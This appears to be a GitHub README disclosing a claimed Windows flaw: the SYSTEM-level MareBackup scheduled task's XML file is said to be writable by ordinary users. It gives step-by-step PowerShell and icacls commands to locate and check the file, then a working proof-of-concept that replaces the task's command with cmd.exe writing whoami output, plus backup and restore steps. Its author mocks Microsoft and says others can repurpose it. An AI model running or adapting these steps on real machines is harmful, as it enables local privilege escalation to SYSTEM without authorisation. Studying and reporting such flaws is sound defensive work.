This repository is posted purely for the fun of it, its so pathetic, so stucked inside every Windows machine lives a scheduled task called MareBackup, authored by Microsoft, running as SYSTEM (the highest privilege level on the box) okay now the fun part: its last run time is 11/30/1999. Thats not a boomer bug, its Windows way of saying "this thing has literally never run in its entire life" Microsoft registered it with zero triggers, gave BUILTIN\Users full control over the task file, handed out FA (Full Access) in the security descriptor, and then just walked away from it HAHAHGA. Its been sitting there since installation doing absolutely nothing, guarding nothing, locked down by nobody, because nobody thought it would ever matter, a forgotten SYSTEM task with the permissions of a public park bench. Classic Microsoft moment. That being said i will show you some fun stuff, but i will not exploit it or anything, but anyone with a little bit of knowlage can twist and turn this into whatever.

First step: find MareBackup path:

Get-ChildItem -Path "$env:windir\System32\Tasks" -Recurse -Filter "MareBackup"
<img width="995" height="210" alt="image" src="https://github.com/user-attachments/assets/88dcb9dd-9c69-4e72-ab20-b53716c70226" />

Second step: check permissions of the path:

icacls "C:\WINDOWS\System32\Tasks\Microsoft\Windows\Application Experience"
<img width="1052" height="206" alt="image" src="https://github.com/user-attachments/assets/bfacb09b-d4a5-4efb-bf51-01cb16ccb8f6" />
The directory itself is properly locked down, standard users can only read here. BUUUUUTTT you should see the next step :)

Third step: check permission of the file itself:

icacls "C:\WINDOWS\System32\Tasks\Microsoft\Windows\Application Experience\MareBackup"
<img width="1072" height="226" alt="image" src="https://github.com/user-attachments/assets/47540fd4-56b6-42bd-8159-5e1f14026bf0" />
here we can see that we can edit the XML file GAHAGAGHA, thats so funny cuz the directory is fully locked but the file itself is not, sensational.

Forth step: check the status with normal non admin ps:

schtasks /query /tn "\Microsoft\Windows\Application Experience\MareBackup" /v /fo LIST
<img width="1469" height="765" alt="image" src="https://github.com/user-attachments/assets/e778bc99-a6b3-47fe-a473-b91a33bf23b1" />
Here is the fun part where you can see that the last run time is 11/30/1999. Perfect.

Fifth step: make a bak file of the original:

copy "C:\WINDOWS\System32\Tasks\Microsoft\Windows\Application Experience\MareBackup" C:\Windows\Temp\MareBackup.bak

Sixt step: now change the file from normal non admin ps:

$path = "C:\WINDOWS\System32\Tasks\Microsoft\Windows\Application Experience\MareBackup"
$content = Get-Content $path -Raw
$newContent = $content -replace '<Command>%windir%\\system32\\compattelrunner.exe</Command>\s*<Arguments>[^<]*</Arguments>', '<Command>cmd.exe</Command><Arguments>/c whoami > C:\Windows\Temp\poc-marebackup.txt</Arguments>'
Set-Content -Path $path -Value $newContent -Encoding Unicode

Seventh step: now check if it is modified:

Get-Content "C:\WINDOWS\System32\Tasks\Microsoft\Windows\Application Experience\MareBackup" | Select-String "cmd.exe"
<img width="1845" height="132" alt="image" src="https://github.com/user-attachments/assets/4c68a802-9e6a-4cb8-964c-74703ec22456" />

When confirmed you can place the original saved bak file back by doing this:

copy C:\Windows\Temp\MareBackup.bak "C:\WINDOWS\System32\Tasks\Microsoft\Windows\Application Experience\MareBackup"

This is for educational and fun purposes only so please.







